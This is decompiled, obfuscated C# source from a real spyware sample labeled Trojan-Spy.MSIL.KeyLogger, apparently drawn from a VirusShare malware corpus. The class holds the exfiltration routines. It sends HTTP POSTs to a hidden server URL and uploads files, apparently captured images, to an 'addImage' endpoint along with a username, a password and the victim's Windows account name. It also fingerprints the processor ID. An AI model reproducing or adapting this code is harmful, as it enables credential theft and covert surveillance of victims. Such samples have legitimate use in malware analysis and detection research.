// Decompiled with JetBrains decompiler
// Type: អ
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using KeyLogger.Properties;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Web;

internal class អ
{
  public string ឮ;

  public string ឪ(string Url, string Post)
  {
    do
      ;
    while (false);
    byte[] bytes = Encoding.UTF8.GetBytes(Post);
    string end;
    string str;
    try
    {
      WebRequest webRequest = WebRequest.Create(Url);
      webRequest.Method = "POST";
      webRequest.ContentType = "application/x-www-form-urlencoded";
      webRequest.ContentLength = (long) bytes.Length;
      webRequest.Timeout = 300000;
      if (bytes.Length > 0)
      {
        using (Stream requestStream = webRequest.GetRequestStream())
          requestStream.Write(bytes, 0, bytes.Length);
      }
      StreamReader streamReader = new StreamReader(webRequest.GetResponse().GetResponseStream());
      end = streamReader.ReadToEnd();
      streamReader.Close();
    }
    catch (Exception ex)
    {
      this.ឨ(ex);
      str = "0";
      goto label_11;
    }
    return end;
label_11:
    return str;
  }

  public string ឤ(string s)
  {
    do
      ;
    while (false);
    return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
  }

  public void ឬ(string file, string user, string pass)
  {
    do
      ;
    while (false);
    try
    {
      if (!file.Equals(""))
      {
        if (!user.Equals(""))
        {
          if (!pass.Equals(""))
          {
            if (Settings.Default.RemoteAccess)
            {
              WebClient webClient = new WebClient();
              webClient.Headers.Add("Content-Type", "binary/octet-stream");
              webClient.UploadFileAsync(new Uri(this.ឮ + "?class=application&method=addImage&parameters=" + HttpUtility.UrlEncode(user) + "," + HttpUtility.UrlEncode(pass) + "," + HttpUtility.UrlEncode(Environment.UserName)), "POST", file);
            }
          }
        }
      }
    }
    catch (Exception ex)
    {
      this.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public void ឨ(Exception e)
  {
    do
      ;
    while (false);
    try
    {
      string str = "--------------------------------------------------------------------------------------";
      if (!System.IO.File.Exists(Settings.Default.TempFileLocation + "\\Errors.txt"))
      {
        System.IO.File.Create(Settings.Default.TempFileLocation + "\\Errors.txt").Close();
      }
      else
      {
        using (StreamWriter streamWriter = System.IO.File.AppendText(Settings.Default.TempFileLocation + "\\Errors.txt"))
          streamWriter.Write(string.Format("\r\n\r\n{0} - {1}\r\n{2}\r\n{3}", (object) DateTime.Now.ToString(), (object) e.TargetSite.ToString(), (object) str, (object) e.Message));
      }
    }
    catch
    {
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public string ឦ()
  {
    do
      ;
    while (false);
    string str = "--";
    try
    {
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
        str = (string) managementBaseObject["ProcessorId"];
    }
    catch (Exception ex)
    {
      this.ឨ(ex);
    }
    return str;
  }

  public អ()
  {
    do
      ;
    while (false);
    this.ឮ = \u17CE.\u17D9;
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }
}
